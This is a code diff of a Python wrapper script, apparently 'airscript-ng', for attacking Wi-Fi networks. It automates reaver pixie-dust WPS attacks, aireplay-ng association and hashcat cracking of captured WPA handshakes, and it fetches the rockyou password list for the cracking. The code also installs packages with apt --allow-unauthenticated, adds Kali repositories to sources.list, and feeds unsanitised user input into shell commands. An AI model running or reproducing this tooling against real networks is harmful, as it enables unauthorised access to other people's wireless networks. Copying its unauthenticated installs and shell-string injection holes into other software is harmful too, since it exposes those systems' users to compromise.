+      l | abcdefghijklmnopqrstuvwxyz
+      u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
+      d | 0123456789
+      h | 0123456789abcdef
+      H | 0123456789ABCDEF
+      s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+      a | ?l?u?d?s
+      b | 0x00 - 0xff
+
+    """)
+                            print("This is a very crucial step. If you are confused, type [help] to view the documentation again.")
+                            global mainhashmask 
+                            mainhashmask = input("\nPlease enter a Mask/Charset. For example:?u?u?u?u?u?u?u?u or ABCD?u?u?u?u ~# ")
+                            if mainhashmask.lower().startswith("help"):
+                                os.system("cat ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt | less")
+                                continue
+                            if mainhashmask != "":
+                                break
+                            else:
+                                continue
+                        while True:
+                            retaingputemp = input("What temperature do you want to retain? (degress celsius) ~# ")
+                            maxgputemp = input("What should be the cutoff/maximum temperature limit? (degress celsius) ~# ")
+                            retaingputemp = int(retaingputemp)
+                            maxgputemp = int(maxgputemp)
+                            if retaingputemp < 80 and maxgputemp < 85:
+                                retaingputemp = str(retaingputemp)
+                                maxgputemp = str(maxgputemp)
+                                break
+                            else:
+                                retaingputemp = str(retaingputemp)
+                                maxgputemp = str(maxgputemp)
+                                print("\nTemperature value inappropriate! Please input proper and safe values. [<80c for retain  and <85c for max]")
+                                continue
+                        hfinal()
+                        print("[INPUT MASK/CHARSET]: %s" %(mainhashmask))
+                        if os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
+                            os.system("mkdir ~/.airscriptNG/ 2>/dev/null")
+                        if input("\nOptions correctly chosen? Start cracking? [y/n] ~# ").lower().startswith("y"):
+                            if os.system("ls ~/.airscriptNG/HANDSHAKEFILE >/dev/null 2>/dev/null") != 0:
+                                os.system("touch ~/.airscriptNG/HANDSHAKEFILE")
+                            os.system("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 3 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hcatutilspath,gpucrack,hcatpath,mainhashmask,retaingputemp,maxgputemp,hcatpath))
+                            os.system("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
+                            os.system("rm -r ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null")
+                            os.system("rm %s/hashcat.potfile %s/hashcat.log" %(hcatpath,hcatpath))
+                            os._exit(1)
+                        #End here
+                        hfinal()
+                    elif critchoice == "3":
+                        ackmode = "Built-in wordlist"
+                        mainwordlist = str(mainwordlist)
+                        input("\nPlease locate and click inside the Hashcat-utils directory. Remember to click inside and press ok! (press enter) ~# ")
+                        hcatutilspath = filedialog.askdirectory()
+                        hcatutilspath = str(hcatutilspath)
+                        while True:
+                            os.system("clear")
+                            print("\nPlease choose a built-in wordlist: ")
+                            print("\nType [1] - Rockyou.txt ~15 Million lines, Skull security")
+                            print("Type [2] - Phpbb.txt, Skull security")
+                            print("Type [3] - Top 1350~ WPA/WPA2 list, from me")
+                            readwordlist = input("\nEnter choice ~# ")
+                            global onlinelist
+                            if os.system("ls ~/.airscriptNG/Wordlists/ >/dev/null 2>/dev/null") != 0:
+                                    os.system("mkdir ~/.airscriptNG/Wordlists/")
+                            if readwordlist == "1":
+                                if os.system("ls ~/.airscriptNG/Wordlists/rockyou.txt.bz2 2>/dev/null >/dev/null") != 0 and os.system("ls ~/.airscriptNG/Wordlists/rockyou.txt 2>/dev/null >/dev/null") != 0:
+                                    os.system("cd ~/.airscriptNG/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2 && bzip2 -d rockyou.txt.bz2")
+                                onlinelist = "~/.airscriptNG/Wordlists/rockyou.txt"
+                                break
+                            elif readwordlist == "2":
+                                if os.system("ls ~/.airscriptNG/Wordlists/phpbb.txt.bz2 2>/dev/null >/dev/null") != 0 and os.system("ls ~/.airscriptNG/Wordlists/phpbb.txt 2>/dev/null >/dev/null") != 0:
+                                    os.system("cd ~/.airscriptNG/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/phpbb.txt.bz2 && bzip2 -d phpbb.txt.bz2")
+                                onlinelist = "~/.airscriptNG/Wordlists/phpbb.txt"
+                                break
+                            elif readwordlist == "3":
+                                if os.system("ls ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null >/dev/null"):
+                                    os.system("cd ~/.airscriptNG/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
+                                onlinelist = "~/.airscriptNG/Dependencies-for-Airscript-ng/Small-wpa-list"
+                                break
+                            else:
+                                continue
+                        mainwordlist = str(onlinelist)
+                        while True:
+                            retaingputemp = input("What temperature do you want to retain? (degress celsius) ~# ")
+                            maxgputemp = input("What should be the cutoff/maximum temperature limit? (degress celsius) ~# ")
+                            retaingputemp = int(retaingputemp)
+                            maxgputemp = int(maxgputemp)
+                            if retaingputemp < 80 and maxgputemp < 85:
+                                retaingputemp = str(retaingputemp)
+                                maxgputemp = str(maxgputemp)
+                                break
+                            else:
+                                retaingputemp = str(retaingputemp)
+                                maxgputemp = str(maxgputemp)
+                                print("\nTemperature value inappropriate! Please input proper and safe values. [<80c for retain  and <85c for max]")
+                                continue
+                        hfinal()
+                        if input("\nOptions correctly chosen? Start cracking? [y/n] ~# ").lower().startswith("y"):
+                            if os.system("ls ~/.airscriptNG/HANDSHAKEFILE >/dev/null 2>/dev/null") != 0:
+                                os.system("touch ~/.airscriptNG/HANDSHAKEFILE")
+                            os.system("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hcatutilspath,gpucrack,hcatpath,mainwordlist,retaingputemp,maxgputemp,hcatpath))
+                            os.system("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
+                            os.system("rm -r ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null")
+                            os.system("rm %s/hashcat.potfile %s/hashcat.log" %(hcatpath,hcatpath))
+                            os._exit(1)
+                        hfinal()
+                    elif critchoice == "99":
+                        title()
+                    else:
+                        hcatfunc()
+            hcatfunc()
+            #FINISH THIS PART 
+        elif cpugpu == "99":
+            title()
+        else:
+            handshake_func()
+    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError,ValueError):
+        import os
+        os.system("clear")
+        os._exit(1)
+    #Finish here
+    #WILL BE THE GO-TO PLACE TO CRACK AN EXISTING WPA/WPA2 HANDSHAKE, OPTIONS FOR USE WITH AIRCRACK, HASHCAT, GENPMK, COWPAWTTY, AIROLIB-NG MUST BE SUPPORTED!
+def unaliasfunc(): #FIXES APPLIED, WITH SOME SACIFICE, REVIEW FINAL CODE.
+    print("\nScrewed up terminal in some unusual way?")
+    def helpme():
+        import os
+        global unfunc
+        unfunc = input("\n|MENU|REMOVE_ALIAS|We gotcha' covered! remove commands from system? [y/n] >>")
+        if unfunc == "":
+            os.system('clear')
+            helpme()
+        elif unfunc.lower().startswith("n"):
+            title()
+        elif unfunc.lower().startswith("y"):
+            if os.system("ls ~/.airscriptNG/bash_backup/bashrc-* 2>/dev/null >/dev/null") == 0:
+                os.system("clear")
+                print("\n")
+                os.system("echo Backup file found from $(ls ~/.airscriptNG/bash_backup/ | sort | awk -F '-' {'print $2'})")
+                if input("Restore? [y/n] >>").lower().startswith("y"):
+                    print("\n[+]Restoring bash resource!")
+                    if os.system("cp ~/.airscriptNG/bash_backup/bashrc-* ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" 2>/dev/null") == 0:
+                        print("[+]Restored successfully!\n")
+                        os._exit(1)
+                    else:
+                        input("\n[-]Problems occured. Press enter to return to menu >>")
+                        title()
+                else:
+                    os.system("clear")
+                    title()
+            else:
+                def bork():
+                    print("\nNo Backup file found!")
+                    print("If terminal is borked type 'reset' ")
+                    print("If still having problems, just remove any aliases at the end of ~/.bash_aliases file to do with 'airscript-ng'!")
+                    if input("\n\nType [ok] to return to menu >>").lower().startswith("ok"):
+                        title()
+                    else:
+                        os.system("clear")
+                        bork()
+                bork()
+    helpme()
+def driverdownloadfunc(): #DOWNLOADS THE DRIVERS FROM BROWSER
+    import webbrowser, os
+    def funtimes():
+        print("""
+
+ ██████╗ ██████╗ ███████╗███╗   ██╗ ██████╗██╗         ██████╗ ██████╗ ██╗██╗   ██╗███████╗██████╗ ███████╗
+██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██║         ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔══██╗██╔════╝
+██║   ██║██████╔╝█████╗  ██╔██╗ ██║██║     ██║         ██║  ██║██████╔╝██║██║   ██║█████╗  ██████╔╝███████╗
+██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║██║     ██║         ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║
+╚██████╔╝██║     ███████╗██║ ╚████║╚██████╗███████╗    ██████╔╝██║  ██║██║ ╚████╔╝ ███████╗██║  ██║███████║
+ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝
+                                                                                                           
+""")
+        global gpufun
+        gpufun = input("|MENU|POST_CRACK|GPU|DRIVER_DOWNLOAD|(Do you have an Nvidia GPU or AMD GPU? [a/n]) ~# ")
+        if gpufun.lower().startswith("n"):
+            os.system("clear")
+            print("A browser page will open, download the newest drivers from the archive.")
+            webbrowser.open('http://www.nvidia.com/object/linux-amd64-display-archive.html')
+            print("Once you have downloaded your driver of choice, Install it using the menu option (Re-run the program).")
+            os._exit(1)
+        elif gpufun.lower().startswith("a"):
+            os.system("clear")
+            print("A browser page will open, choose your drivers from there.")
+            webbrowser.open('http://support.amd.com/en-us/download')
+            print("Once you have downloaded your driver of choice, Install it using the menu option (Re-run the program).")
+            os._exit(1)
+    funtimes()   
+def hashcatdownloadfunc(): #GIT CLONES AND MAKE-BUILDs HASHCAT!
+    import os, webbrowser, time
+    from tkinter import filedialog
+    from tkinter import Tk
+    os.system("clear")
+    print("""
+    
+              a          a
+             aaa        aaa
+            aaaaaaaaaaaaaaaa
+           aaaaaaaaaaaaaaaaaa
+          aaaaafaaaaaaafaaaaaa
+          aaaaaaaaaaaaaaaaaaaa
+           aaaaaaaaaaaaaaaaaa
+            aaaaaaa  aaaaaaa
+             aaaaaaaaaaaaaa
+  a         aaaaaaaaaaaaaaaa
+ aaa       aaaaaaaaaaaaaaaaaa
+ aaa      aaaaaaaaaaaaaaaaaaaa
+ aaa     aaaaaaaaaaaaaaaaaaaaaa
+ aaa    aaaaaaaaaaaaaaaaaaaaaaaa
+  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
+  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
+  aaa    aaaaaaaaaaaaaaaaaaaaaa
+   aaa    aaaaaaaaaaaaaaaaaaaa
+    aaaaaaaaaaaaaaaaaaaaaaaaaa
+     aaaaaaaaaaaaaaaaaaaaaaaaa
+
+██╗  ██╗ █████╗ ███████╗██╗  ██╗ ██████╗ █████╗ ████████╗    
+██║  ██║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝       
+███████║███████║███████╗███████║██║     ███████║   ██║       
+██╔══██║██╔══██║╚════██║██╔══██║██║     ██╔══██║   ██║       
+██║  ██║██║  ██║███████║██║  ██║╚██████╗██║  ██║   ██║       
+╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝                                                                   
+
+""")
+    if input("Download and setup hashcat for GPU-WPA cracking? [y/n] >> ").lower().startswith("y"):
+        os.system("clear")
+        print("\nWhere would you like hashcat installed?")
+        input("\n|MENU|POST_CRACK|GPU|HASHCAT_DOWNLOAD|(Please delete any older versions and press enter to choose directory) >>")
+        global hashpath
+        Tk().withdraw()
+        hashpath = filedialog.askdirectory()
+        hashpath = str(hashpath)
+        print("\nA browser window will now open. ALT+TAB back to the terminal")
+        time.sleep(3)
+        webbrowser.open("https://hashcat.net/")
+        #print("Please right-click and copy/paste link location on the button next to hashcat binaries")
+        downloadpath = input("\nPlease paste the URL/ADDRESS/LINK-LOCATION of the hashcat binaries download button EG:https://hashcat.net/files/hashcat-3.6.0.7z ~# ")
+        os.system("sudo apt install p7zip p7zip-full -y;cd %s;wget %s;7z x hashcat-*;git clone https://github.com/hashcat/hashcat-utils.git;cd hashcat-utils/src/;make" %(hashpath, downloadpath))
+        #os.system("cd %s;git clone https://github.com/hashcat/hashcat.git;cd hashcat/;git submodule update --init;make;cd ..;git clone https://github.com/hashcat/hashcat-utils.git;cd hashcat-utils/src/;make" %(hashpath))
+        os.system("\necho '[+] Hashcat is now ready to use, it will be inside the folder you chose ' ")
+        os._exit(1)
+    else:
+        title()
+def drifunc(): #Installs downloaded drivers
+    import os
+    from tkinter.filedialog import askopenfilename, Tk as snak
+    snak().withdraw()
+    def Nvidia():
+        os.system("clear")
+        global nvenc
+        path = input("Please select where the NVIDIA driver file is located. Press enter (you may have to answer yes to some options) ~# ")
+        nvenc = askopenfilename()
+        nvenc = str(nvenc)
+        os.system("clear")
+        input("\n|MENU|POST_CRACK|GPU|DRIVER_INSTALL|NVIDIA|(Please remove any previous drivers/driver downloads and hit enter) ~# ")
+        os.system("cd %s;sudo ./NVIDIA-Linux*" %(nvenc))
+        print("echo NVIDIA driver is installed!")
+        print("now reboot, if you see any error, please head to: 'https://goo.gl/f1GU1F'")
+    def AMD():
+        os.system("clear")
+        from tkinter import filedialog
+        from tkinter import Tk
+        global AMDlol 
+        AMDlol = input("Please select the folder where the AMD driver tar.xz file is located. Press enter ~# ")
+        AMDlol = filedialog.askdirectory()
+        AMDlol = str(AMDlol)
+        os.system("clear")
+        input("\n|MENU|POST_CRACK|GPU|DRIVER_INSTALL|AMD|(Please remove any previous drivers/driver downloads and hit enter) ~# ")
+        os.system("cd %s;tar -Jxvf amdgpu-pro*;cd amdgpu-pro*;./amdgpu-pro-install -y" %(AMDlol))
+        print("echo AMD driver is installed!")
+        print("now reboot, if you see any error, type: 'amdgpu-pro-uninstall' and reboot.")
+    print("""
+
+██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗         ██████╗ ██████╗ ██╗██╗   ██╗███████╗██████╗ ███████╗
+██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║         ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔══██╗██╔════╝
+██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║         ██║  ██║██████╔╝██║██║   ██║█████╗  ██████╔╝███████╗
+██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║         ██║  ██║██╔══██╗██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║
+██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗    ██████╔╝██║  ██║██║ ╚████╔╝ ███████╗██║  ██║███████║
+╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝
+                                                                                                              
+
+""")
+    print("This is the driver installation screen. Your options are:")
+    print("\n\nType [1] - Install the NVIDIA-LINUX driver for Hashcat (NVIDIA GTX 900,10 Series)")
+    print("Type [2] - Install the AMDGPU-PRO driver to use Hashcat with an AMD gpu (MOST GPUs, check hashcat.net)")
+    sel = input("\n|MENU|POST_CRACK|GPU|DRIVER_INSTALL|(Type number) >>")
+    if sel == "":
+        drifunc()
+    if sel == "1":
+        Nvidia()
+    if sel == "2":
+        AMD()
+def aliasfunc(): #FIXES APPLIED, WITH SOME SACIFICE, REVIEW FINAL CODE.
+    import os
+    os.system("clear")
+    if input("\n\nAdd Airscript-ng commands to system? (append alias to ~/.bash_aliases)? [y/n] >").lower().startswith("y"):
+        os.system('clear')
+        if os.system("ls .airscriptNG/bash_backup/ 2>/dev/null >/dev/null") != 0:
+            if os.system("mkdir -p ~/.airscriptNG/bash_backup/ 2>/dev/null") == 0:
+                if os.system("ls ~/.bash_aliases 2>/dev/null >/dev/null") == 0:
+                    if os.system("ls ~/.airscriptNG/bash_backup/bashrc-* 2>/dev/null >/dev/null") != 0:
+                        os.system("cp ~/.bash_aliases ~/.airscriptNG/bash_backup/bashrc-$(date | awk -F ' ' {'print $1,$2,$3,$6'} | tr -d '[:space:]' | sort) 2>/dev/null ")
+                else:
+                    pass
+        print("\n\nPlease choose location of where you have the airscript-ng.py file. ")
+        print("please note though that removing or modifying the script could result in disaster. Use the remove_alias option before doing so!")
+        input("\n|MENU|INSTALL_ALIAS|Press enter to continue >>")
+        from tkinter.filedialog import askopenfilename, Tk as pwned
+        pwned().withdraw()
+        global zcat
+        zcat = askopenfilename()
+        zcat = str(zcat)
+        os.system("echo \"alias airscript-ng='python3 %s'\" >> ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" " %(zcat))
+        print("\nAlias has been successfully added to ~/.bash_aliases.")
+        print("Invoke this script from anywhere by typing \"airscript-ng\" \n")
+        os._exit(1)
+    else:
+        os.system("clear")
+        title()
+def depandancies(): #This is fine 
+    import os,time
+    print("[-] Updating system and installing some dependancies. Please hold!")
+    os.system("echo '[-] 25% done';sudo apt update --allow-unauthenticated > /dev/null 2>/dev/null && echo '[-] 50% done' && sudo apt install xterm -y --allow-unauthenticated >/dev/null 2>/dev/null")
+    os.system("xterm $HOLD -title 'Installing any dependancies [airscript-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk driftnet dsniff build-essential make bzip2 -y --allow-unauthenticated && update-rc.d isc-dhcp-server disable'")
+    time.sleep(2)
+def check_depends(): #Still works
+    import os,time
+    x = os.system("dpkg -s xterm gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk dsniff driftnet build-essential make bzip2 2>/dev/null >/dev/null")
+    if x == 0:
+        pass
+    else:
+        depandancies()
+    #array = ["xterm","gawk","reaver","aircrack-ng","wireless-tools","ethtool","apt-transport-https","iproute2","git","isc-dhcp-server","python3-tk","dsniff","driftnet"]
+    #for i in array[0:len(array)]:
+    #    x = os.system("dpkg -s %s 2>/dev/null > /dev/null" %(i))
+    #    if x == 0:
+    #        pass
+    #    else:
+    #        depandancies()
+def clearScreen(): #This is fine too but devise not defined fix
+    import os
+    if input("[i] Press 'y' to perform cleanup! >>").lower().startswith("y"):
+        print("\n[info] Wait a few seconds, cleaning up...")
+        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
+        os.system("sudo systemctl start NetworkManager.service")
+        os.system("sudo systemctl start wpa_supplicant.service")
+        os.system("clear")
+        if input("\n[-] Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
+            os.system("rm log.txt 2>/dev/null")
             os._exit(1)
         else:
             os.system("clear")
             title()
-            os.system("rm log.txt")
+            os.system("rm log.txt 2>/dev/null")
     else:
         clearScreen()
-def revert():
+def revert(): #revert repos is fine until apt-add solution is devised
     import os
     if os.system("ls -a backup-repos >> log.txt") == 0:
         os.system("sudo cp backup-repos/sources.list /etc/apt/sources.list")
@@ -40,24 +858,27 @@ def revert():
     else:
         print("Backup file not found!")
         clearScreen()
-def install_deps():
+def install_deps(): #Needs a little bit of work
     import os
     os.system("clear")
-    print("[+]This option will append a few lines to your '/etc/apt/sources.list' file.")
-    print("[info]After this the program will update the apt repos and install the dependancies")
+    print("[+] This option will append a few lines to your '/etc/apt/sources.list' file.")
+    print("[info] After this the program will update the apt repos and install the dependancies")
     print("[-] Please, Please remember that adding additional repos to debian is not advised.Since we'll only be adding the Kali-Rolling Repos, You should be fine! Do not run this on a KALI system!")
-    tf = input("[?]Press [y] to proceed or CTRL+C to exit. >>")
+    tf = input("[?] Press [y] to proceed or CTRL+C to exit. >>")
     if tf.lower().startswith("y"):
-        os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
+        if os.system("iwconfig monitor 2>/dev/null") == 0:
+            os.system("iw dev monitor del")
+        else:
+            pass
         if os.system("ls -a /etc/apt/sources.list >> log.txt") == 0:
-            if os.system("ls -a backup-repos >> log.txt") !=0:   
+            if os.system("ls -a backup-repos >> log.txt 2>/dev/null") !=0:   
                 os.system("sudo mkdir backup-repos;cd backup-repos;cp /etc/apt/sources.list ./")
                 com = os.system("sudo echo '#This line was added by airscript-ng, remove the line below if problems occur' >> /etc/apt/sources.list") 
-                sou = os.system("sudo echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' >> /etc/apt/sources.list") 
+                sou = os.system("sudo echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib #By AIRSCRIPT-NG' >> /etc/apt/sources.list") 
                 if com == 0 and sou == 0:
-                    print("[+]APT sources successfully added. If any problems occur remove last line from '/etc/apt/sources.list' file.")
+                    print("[+] APT sources successfully added. If any problems occur remove last line from '/etc/apt/sources.list' file.")
                     depandancies()
-                    print("Dependancies successfully installed! If you see errors above remove last line from '/etc/apt/sources.list' file.")
+                    print("Dependancies successfully installed! If you see errors above remove last line from '/etc/apt/sources.list' file, or use option 4 from the main-menu.")
                     clearScreen()
                 else:
                     print("Problems occured when trying to add the repos, reverting to old repo.")
@@ -73,22 +894,25 @@ def install_deps():
             print("I didn't find anything for '/etc/apt/sources.list'")
             print("Either your system doesn't use APT or isn't a debian based distro.")
             print("Please try something else.")
+            input()
             clearScreen()
     else:
         install_deps()
-def reaver():
+def reaver():  #Needs major overhaul
     import os, time
     try:
         os.system('clear')
-        print("[+]Thanks for chossing reaver")
-        print("[-]Please note that Reaver-pixie dust method only works on very few WPS access points worldwide. This number is dwindlling and success chances are very low. That doesn't mean its all 'Doom and Gloom' ")
-        print("[+]Despite the odds, when it works, it feels magical. Like the powers above sprinkled some pixie dust on your computer.")
-        ack = input("[?]Type 'y' to continue>>")
+        print("[+] Thanks for chosing reaver")
+        print("[-] Please note that Reaver-pixie dust method only works on very few WPS access points worldwide.")
+        #print("[-] Please note that Reaver-pixie dust method only works on very few WPS access points worldwide. This number is dwindlling and success chances are very low. That doesn't mean its all 'Doom and Gloom' ")
+        #print("[+] Despite the odds, when it works, it feels magical. Like the powers above sprinkled some pixie dust on your computer.")
+        ack = input("[?] Type 'y' to continue>>")
         if ack.lower().startswith('y'):
-            print("[-]Checking for dependancies")
-            check_depends()
-            print("[-]All dependancies are met ma dude. Make sure you have correct drivers!")
-            time.sleep(2)
+            print("[-] Checking for dependancies")
+            reaverspecialdeps()
+            #check_depends()
+            print("[-] All dependancies are met ma dude. Make sure you have correct drivers! ")
+            time.sleep(1)
             os.system('clear')
             print("""
 
@@ -100,58 +924,73 @@ def reaver():
 ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   
 
 
-[info]Developed by Sh3llCod3, Using the reaver tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
+[info] Developed by Sh3llCod3, Using the reaver tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
             print("Ok lets put a Card in monitor mode\n")
-            print("[+]your cards are:\n ")
-            os.system("airmon-ng | grep -i 'wlan*' | cut -d' ' -f 1 | awk -F ' ' {'print $2'}")
+            os.system("sudo systemctl stop NetworkManager.service")
+            os.system("sudo systemctl stop wpa_supplicant.service")
+            print("[+] your cards are:\n ")
+            os.system("ls /sys/class/net | grep ^wl")
             print("\n")
-            index = input("[?]What card shall I put in monitor mode? wlan0 [enter 0] wlan1 [enter 1] etc >>")
-            query = ("wlan"+"%s" %(index))
-            query = str(query)
-            os.system("airmon-ng start %s >> log.txt" %(query))
-            os.system('clear')
-            print("[info]Ok, seems like %s is started, time to get crackin'" %(query))
-            print("[info]Now we'll run wash to find all the wps networks around")
-            print("[info]Please press CTRL+C once you see your target network")
+            global index
+            index = input("[?] What card shall I put in monitor-mode/use? (copy/paste) >> ")
+            index = str(index)
+            os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
+            print("[info] Ok, seems like %s is started, time to get crackin'" %(index))
+            print("[info] Now we'll run wash to find all the wps networks around")
+            print("[info] Please press CTRL+C once you see your target network")
             z = input("\nGot all that? Press enter >>")
             z = str(z)
-            os.system("wash -i %smon" %(query))
+            os.system("wash -i %s" %(index))
             b = input("\n[?] Just copy+paste the bssid of the target network [no spaces]>>")
             b = str(b)
-            c = input("[?]Finally tell me the channel of the target ap [look for Ch] >>")
+            c = input("[?] Finally tell me the channel of the target ap [look for Ch] >>")
             c = str(c)
             os.system("clear")
-            print("[info]Once you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
-            print("[info] Please note that this can backfire and lock the AP if left for too long")
-            print("[info]It should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
-            d = input("\nPlease press enter to continue or CTRL+C to exit now >>")
-            os.system("reaver -i %smon -b %s -K 1 -vvv -c %s" %(query,b,c))
-            print("\n[info]By now it has either worked or not. If it hasn't, well then i'm sorry. Please use the aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
-            clearScreen()
+            def fix():
+                print("[info] Once you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
+                print("[info] Please note that this can backfire and lock the AP if left for too long")
+                print("[info] It should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
+                print("\nHow do you want to run it? [1] to run normally or [2] to fix 'FAILED TO ASSOCIATE WITH AP'")
+                opt = input("\nChoose either 1 or 2 >>")
+                if opt == "1":
+                    os.system("reaver -i %s -b %s -K 1 -vvv -c %s" %(index,b,c))
+                    print("\n[info] By now it has either worked or not. If it hasn't, well then i'm sorry. Please use the fix/aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
+                    clearScreen()
+                if opt == "2":
+                    os.system("xterm $HOLD -title 'CLOSE ME ONCE DONE'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e aireplay-ng -1 30 -a %s %s&reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
+                    print("\n[info] By now it has either worked or not. If not then I'm sorry or if it has then CONGRATS ON FINDING THE PSK!")
+                    print("\n[info] Please close the Xterm at the top right now, as keeping it on is pretty much useless!")
+                    clearScreen()
+                else:
+                    os.system("clear")
+                    fix()
+            fix()
         else:
             os.system('clear')
             reaver()
     except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
-            print("\n[info]Wait a few seconds, cleaning up...")
-            os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
+            print("\n[info] Wait a few seconds, cleaning up...")
+            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
+            os.system("sudo systemctl start NetworkManager.service")
+            os.system("sudo systemctl start wpa_supplicant.service")
             os.system("clear")
-            if input("\n[-]Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
-                os.system("rm log.txt")
+            if input("\n[-] Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
+                os.system("rm log.txt 2>/dev/null")
                 os._exit(1)
             else:
                 os.system("clear")
                 title()
-                os.system("rm log.txt")
-def aircrackng():
+                os.system("rm log.txt 2>/dev/null")
+def aircrackng(): #Lots of effort needed 
     import os,time
-    print("[-]Checking for dependancies")
+    print("[-] Checking for dependancies")
     check_depends()
-    print("[-]All dependancies are met ma dude. Make sure you have correct drivers!")
-    time.sleep(2)		
+    print("[-] All dependancies are met ma dude. Make sure you have correct drivers! ")
+    time.sleep(1)		
     os.system("clear")
     while True:
         try:
-            def mainScreen():                
+            def mainScreen():
                 print ("""
     \n
 
@@ -163,123 +1002,138 @@ def aircrackng():
 ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝  ╚═══╝ ╚═════╝ 
 
 
-[info]Developed by Sh3llCod3, Using the Aircrack-ng tool. 2017-2020. Use with legal caution, disclaimer applies.                                                                                  
+[info] Developed by Sh3llCod3, Using the Aircrack-ng tool. 2017-2020. Use with legal caution, disclaimer applies.                                                                                  
     """)
                 os.system("echo 'Starting...'")
-                os.system("airmon-ng stop wlan1mon > log.txt && airmon-ng stop wlan0mon >> log.txt")
+                if os.system("ls -l HANDSHAKES/ 2>/dev/null >/dev/null") != 0:
+                    os.system("mkdir HANDSHAKES")
                 print("\nHi, welcome to aircrack-ng made easy")
                 print("Please read everything that appears at the bottom")
                 print("Thanks for using this program")
+                os.system("sudo systemctl stop NetworkManager.service")
+                os.system("sudo systemctl stop wpa_supplicant.service")
                 print("\n[+] your cards are: \n")
